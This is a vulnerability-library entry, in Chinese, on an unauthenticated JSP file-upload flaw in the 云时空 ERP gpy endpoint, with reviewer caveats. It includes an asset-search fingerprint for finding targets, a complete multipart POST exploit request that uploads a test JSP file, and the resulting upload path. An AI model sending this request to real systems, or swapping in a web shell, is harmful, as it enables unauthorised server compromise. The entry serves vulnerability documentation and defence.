---
source: "wy876 漏洞文库"
title: "云时空ERP gpy JSP上传"
product: "云时空ERP"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "无版本；日期目录及JSP执行映射"
prerequisites: "声称未认证"
side_effects: "文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行"
review_date: "2026-10-02"
source_url: "https://www.yuque.com/xiaokp7/ocvun2/gisby3trr2tide3u"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/ERP%E4%BC%81%E4%B8%9A/%E4%BA%91%E6%97%B6%E7%A9%BA%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9AERP%E7%B3%BB%E7%BB%9F/%E4%BA%91%E6%97%B6%E7%A9%BA%E7%A4%BE%E4%BC%9A%E5%8C%96%E5%95%86%E4%B8%9AERP%E7%B3%BB%E7%BB%9Fgpy%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md"
fofa_unverified: "web.body="
hunter: "web.body=\"/static/plugin/lhgdialog/skins/default.css\""
id: "vw-f7bf716b1840cd53499f2160"
entity_id: "ve-f7bf716b1840cd53499f2160"
schema_version: "1"
---

# 云时空ERP gpy JSP上传

## 条目说明

- 对象与具体问题：云时空ERP；gpy JSP上传
- 版本、配置及部署条件：无版本；日期目录及JSP执行映射
- 认证与权限前提：声称未认证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- Hunter语句被误抽fofa且截web.body=
- 有完整包和年月日路径解释，但无响应/执行证据文本
- 仅上传JSP源不能证明已执行，需响应123对照；无修复build

## 操作风险

文件写入/上传示例可能留下文件、覆盖数据或触发脚本执行。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 一、漏洞简介
云时空社会化商业ERP以大型集团供应链系统为支撑，是基于互联网技术的多渠道模式营销服务管理体系，可以帮助您整合线上和线下交易模式，覆盖企业经营管理应用各个方面。云时空社会化商业ERP系统gpy接口存在任意文件上传漏洞，未经身份认证的攻击者可通过该漏洞在服务器端上传jsp文件获取服务器权限。

## 二、影响版本
+ 云时空社会化商业ERP

## 三、资产测绘
+ hunter`web.body="/static/plugin/lhgdialog/skins/default.css"`
+ 特征


## 四、漏洞复现
```http
POST /servlet/fileupload/gpy HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A1388
Content-Length: 221

--4eea98d02AEa93f60ea08dE3C18A1388
Content-Disposition: form-data; name="file1"; filename="stc.jsp"
Content-Type: application/octet-stream

<% out.println("123"); %>
--4eea98d02AEa93f60ea08dE3C18A1388--
```

> 请求长度说明：原资料 Content-Length 为 221；保留原始标头；其数值未据实际请求体重新计算或验证。


上传文件位置

2023-12-13，为响应时间

```plain
/uploads/pics/2023-12-13/stc.jsp
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gisby3trr2tide3u>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
